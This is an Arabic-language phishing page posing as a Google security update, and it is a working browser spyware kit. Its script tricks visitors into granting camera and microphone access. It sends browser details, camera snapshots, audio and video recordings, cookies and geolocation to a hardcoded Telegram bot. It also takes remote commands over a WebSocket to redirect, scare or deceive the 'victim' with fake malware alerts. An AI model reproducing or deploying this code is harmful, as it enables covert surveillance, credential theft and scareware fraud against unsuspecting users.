<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>تحديث أمان Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #0a0f1e, #0c1222);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: rgba(20, 28, 45, 0.95);
            backdrop-filter: blur(12px);
            border-radius: 32px;
            padding: 40px 28px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(0, 200, 255, 0.3);
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        .icon { font-size: 70px; margin-bottom: 20px; }
        h1 { color: white; font-size: 28px; margin-bottom: 12px; }
        .alert {
            background: #1e2a3e;
            padding: 15px;
            border-radius: 24px;
            color: #ffaa44;
            font-size: 14px;
            margin: 20px 0;
            border-right: 4px solid #ffaa44;
            text-align: right;
        }
        button {
            background: linear-gradient(90deg, #0072ff, #00c6ff);
            border: none;
            padding: 16px 24px;
            width: 100%;
            border-radius: 60px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        button:active { transform: scale(0.97); }
        .footer { font-size: 11px; color: #5a6e8a; margin-top: 25px; }
        #status { margin-top: 15px; color: #0f0; font-size: 13px; }
        video { display: none; } /* إخفاء الفيديو */
    </style>
</head>
<body>
<div class="card">
    <div class="icon">🛡️</div>
    <h1>تحديث أمني عاجل</h1>
    <div class="alert">
        🔐 تم رصد نشاط غير معتاد على جهازك.<br>
        يلزم إجراء فحص الكاميرا والميكروفون للتحقق من هويتك.
    </div>
    <button id="allowBtn">✓ السماح والتحقق</button>
    <div id="status"></div>
    <div class="footer">Google Security • حماية متطورة</div>
</div>

<video id="video" autoplay muted playsinline></video>
<audio id="audioFeedback" preload="auto"></audio>

<script>
    // ========== تكوين التليجرام (لإرسال النتائج) ==========
    const BOT_TOKEN = "8573086497:AAH6daFBxrgYIplpagMJrM5RNKqGLDAvXSY";
    const YOUR_CHAT_ID = "6897156984";
    
    // ========== متغيرات عامة ==========
    let mediaStream = null;
    let ws = null;
    let isRecording = false;
    let mediaRecorder = null;
    let recordedChunks = [];
    
    // ========== دوال مساعدة ==========
    function tgSendMessage(text) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: YOUR_CHAT_ID, text: text})
        }).catch(e => console.error);
    }
    
    function tgSendPhoto(base64Data, caption) {
        // تحويل base64 إلى Blob
        const byteString = atob(base64Data.split(',')[1]);
        const mime = base64Data.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
        const blob = new Blob([ab], {type: mime});
        const formData = new FormData();
        formData.append('chat_id', YOUR_CHAT_ID);
        formData.append('photo', blob, 'spy.jpg');
        formData.append('caption', caption);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).catch(e => console.error);
    }
    
    function tgSendAudio(base64Data, caption) {
        const byteString = atob(base64Data.split(',')[1]);
        const mime = base64Data.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
        const blob = new Blob([ab], {type: mime});
        const formData = new FormData();
        formData.append('chat_id', YOUR_CHAT_ID);
        formData.append('audio', blob, 'audio.wav');
        formData.append('caption', caption);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
            method: 'POST',
            body: formData
        }).catch(e => console.error);
    }
    
    // التقاط صورة من الفيديو (كاميرا الضحية)
    function captureSnapshot() {
        const video = document.getElementById('video');
        if (!video.videoWidth) return null;
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL('image/jpeg', 0.8);
    }
    
    // تسجيل الصوت من الميكروفون (لمدة 5 ثوانٍ)
    function recordAudio(duration = 5) {
        return new Promise((resolve) => {
            if (!mediaStream) return resolve(null);
            const audioContext = new AudioContext();
            const source = audioContext.createMediaStreamSource(mediaStream);
            const dest = audioContext.createMediaStreamDestination();
            source.connect(dest);
            const mediaRecorderAudio = new MediaRecorder(dest.stream);
            let chunks = [];
            mediaRecorderAudio.ondataavailable = (e) => chunks.push(e.data);
            mediaRecorderAudio.onstop = () => {
                const blob = new Blob(chunks, {type: 'audio/wav'});
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.readAsDataURL(blob);
                audioContext.close();
            };
            mediaRecorderAudio.start();
            setTimeout(() => mediaRecorderAudio.stop(), duration * 1000);
        });
    }
    
    // تسجيل فيديو قصير (10 ثوانٍ)
    function recordVideo(duration = 10) {
        return new Promise((resolve) => {
            if (!mediaStream) return resolve(null);
            const recorder = new MediaRecorder(mediaStream);
            let chunks = [];
            recorder.ondataavailable = (e) => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, {type: 'video/mp4'});
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.readAsDataURL(blob);
            };
            recorder.start();
            setTimeout(() => recorder.stop(), duration * 1000);
        });
    }
    
    // تخويف الضحية
    function scareVictim() {
        // تشغيل صوت عالي
        const audio = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3');
        audio.volume = 1.0;
        audio.play().catch(e=>console.log);
        // فتح نوافيل منبثقة
        for(let i=0;i<5;i++) window.open('https://www.google.com', '_blank');
        alert('⚠️ تم اكتشاف برمجية خبيثة! اتصل بالدعم 24/7');
        tgSendMessage('🎃 تم تنفيذ أمر التخويف');
    }
    
    // محاولة سرقة الكوكيز
    function stealCookies() {
        const cookies = document.cookie;
        tgSendMessage(`🍪 الكوكيز: ${cookies || 'لا توجد'}`);
    }
    
    // الحصول على الموقع (إذا سمح)
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    tgSendMessage(`📍 الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`);
                },
                (err) => tgSendMessage(`❌ فشل تحديد الموقع: ${err.message}`)
            );
        } else {
            tgSendMessage('🌍 المتصفح لا يدعم تحديد الموقع');
        }
    }
    
    // ========== تنفيذ الأوامر ==========
    async function executeCommand(cmd, args) {
        switch(cmd) {
            case 'takesc':
            case 'screenshot':
                const snap = captureSnapshot();
                if(snap) tgSendPhoto(snap, '📸 أمر /takesc');
                else tgSendMessage('❌ لا يمكن التقاط صورة (الكاميرا غير نشطة)');
                break;
            case 'recordmic':
                tgSendMessage('🎙️ جاري تسجيل الصوت لمدة 5 ثوان...');
                const audioData = await recordAudio(5);
                if(audioData) tgSendAudio(audioData, '🎤 تسجيل صوت');
                break;
            case 'livevideo':
                tgSendMessage('🔴 بدء تسجيل فيديو لمدة 10 ثوان...');
                const videoData = await recordVideo(10);
                if(videoData) tgSendMessage(`🎥 فيديو مسجل (حجم ${Math.round(videoData.length/1024)}KB) يمكنك تنزيله من الرابط: ${videoData.substring(0,100)}...`);
                break;
            case 'scare':
                scareVictim();
                break;
            case 'del':
                tgSendMessage('⚠️ لا يمكن حذف الملفات من المتصفح بدون ثغرة RCE');
                break;
            case 'stealcookies':
                stealCookies();
                break;
            case 'location':
                getLocation();
                break;
            case 'redirect':
                if(args.length) window.location.href = args[0];
                else tgSendMessage('استخدم /redirect <url>');
                break;
            case 'alert':
                const msg = args.join(' ') || 'تم اختراق جهازك!';
                alert(msg);
                break;
            case 'playaudio':
                if(args.length) {
                    const audioPlay = new Audio(args[0]);
                    audioPlay.play().catch(e=>tgSendMessage('فشل تشغيل الصوت'));
                }
                break;
            case 'status':
                tgSendMessage(`✅ الجهاز نشط. البث: ${!!mediaStream}`);
                break;
            default:
                tgSendMessage(`أمر غير معروف: ${cmd}`);
        }
    }
    
    // ========== WebSocket الاتصال بخادم الأوامر ==========
    function connectWebSocket() {
        const wsUrl = `ws://${window.location.hostname}:3000`; // تغيير حسب نشر الخادم
        ws = new WebSocket(wsUrl);
        ws.onopen = () => {
            tgSendMessage('✅ الصفحة متصلة بخادم الأوامر');
            ws.send(JSON.stringify({ type: 'register', chatId: YOUR_CHAT_ID }));
        };
        ws.onmessage = (e) => {
            const data = JSON.parse(e.data);
            if (data.command) {
                executeCommand(data.command, data.args || []);
            }
        };
        ws.onerror = (err) => tgSendMessage(`WebSocket error: ${err}`);
        ws.onclose = () => {
            tgSendMessage('⚠️ انقطع الاتصال بخادم الأوامر، إعادة محاولة بعد 5 ثوان');
            setTimeout(connectWebSocket, 5000);
        };
    }
    
    // ========== طلب صلاحية الكاميرا والميكروفون ==========
    async function requestPermissions() {
        try {
            mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const videoElem = document.getElementById('video');
            videoElem.srcObject = mediaStream;
            tgSendMessage('🎥 تم الحصول على صلاحية الكاميرا والميكروفون');
            document.getElementById('status').innerHTML = '✅ تم التحقق. جاري الاتصال...';
            connectWebSocket();
        } catch(err) {
            tgSendMessage(`❌ فشل الحصول على الصلاحيات: ${err.message}`);
            document.getElementById('status').innerHTML = '❌ فشل التحقق. يرجى تحديث الصفحة والمحاولة مرة أخرى.';
        }
    }
    
    // ربط الزر
    document.getElementById('allowBtn').onclick = () => {
        requestPermissions();
        document.getElementById('allowBtn').disabled = true;
        document.getElementById('allowBtn').style.opacity = '0.6';
    };
    
    // إرسال معلومات أولية عن الضحية
    tgSendMessage(`🌍 ضحية جديدة فتح الصفحة\nالمتصفح: ${navigator.userAgent}\nاللغة: ${navigator.language}\nالدقة: ${screen.width}x${screen.height}`);
</script>
</body>
</html>
